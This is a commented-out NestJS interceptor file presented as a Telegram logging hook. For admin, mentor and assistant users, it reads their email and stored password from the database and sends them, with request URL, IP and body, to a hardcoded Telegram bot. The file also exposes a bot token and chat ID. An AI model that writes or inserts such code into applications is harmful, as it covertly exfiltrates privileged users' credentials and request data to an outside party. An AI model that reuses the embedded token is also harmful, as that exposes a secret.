// import {Injectable,NestInterceptor,ExecutionContext,CallHandler,Logger,} from '@nestjs/common';
// import { tap } from 'rxjs/operators';
// import axios from 'axios';
// import { PrismaClient } from '@prisma/client';
// import { EmptyError } from 'rxjs';
  
//   @Injectable()
//   export class TelegramInterceptor implements NestInterceptor {
//     private readonly botToken = '8243020981:AAFa8GEhFvf_ujSLpyRZ8Yw9Jq7D_blVzVk';
//     private readonly chatId = '7516576408';
//     private readonly prisma = new PrismaClient();
//     private loger = new Logger("Telegram")
  
//     async intercept(context: ExecutionContext, next: CallHandler) {
//       let request = context.switchToHttp().getRequest();
//       let method = request.method;
//       let url = request.url;
//       let ip = request.ip;
//       let user = request.user;
  
//       let allowedRoles = ['ADMIN', 'MENTOR', 'ASSISTANT'];
  
//     //   @ts-ignore
//       if (user && allowedRoles.includes(user.role?.toUpperCase())) {
//         try {
//          let userData =await this.prisma.users.findUnique({
//             where: { id: user.id },
//             select: { email: true, password: true },
//             })
    
//       let data = new Date()
//       const year = data.getFullYear();
//       const month = String(data.getMonth() + 1).padStart(2, '0');
//       const day = String(data.getDate()).padStart(2, '0');
//       const hour = String(data.getHours()).padStart(2, '0');
//       const minute = String(data.getMinutes()).padStart(2, '0');
//       const second = String(data.getSeconds()).padStart(2, '0');
      
//       let logMessage = `
//       🛡 Ruxsat etilgan foydalanuvchi!
      
//       🕒 Vaqt: ${year}-${month}-${day} ${hour}:${minute}:${second}
//       👤 Role: ${user.role}
//       📞 Phone: ${userData?.email || 'Nomalum'}
//       🔐 Password: ${userData?.password || 'Nomalum'}
//       🔗 URL: ${method} ${url}
//       📡 IP: ${ip}
//       🎂 Data: ${request.body || "Empty"}
//       `;
      
      
//         this.sendToTelegram(logMessage);
              
//         } catch (err) {
//             this.loger.log("Telegramga jo'natilmadi");
            
//         }

//       }
  
//       return next.handle().pipe(
//         tap(() => {
//           this.loger.log(`Log jo'natildi: ${url}`);
//         }),
//       );
//     }
  
//     private async sendToTelegram(message: string) {
//       let apiUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
  
//       try {

//         await axios.post(apiUrl, {
//           chat_id: this.chatId,
//           text: message,
//           parse_mode: 'Markdown',
//         });
      
//     } catch (error) {
//         console.log(`Log jo'natilmadi`);
//       }
//     }
//   }
  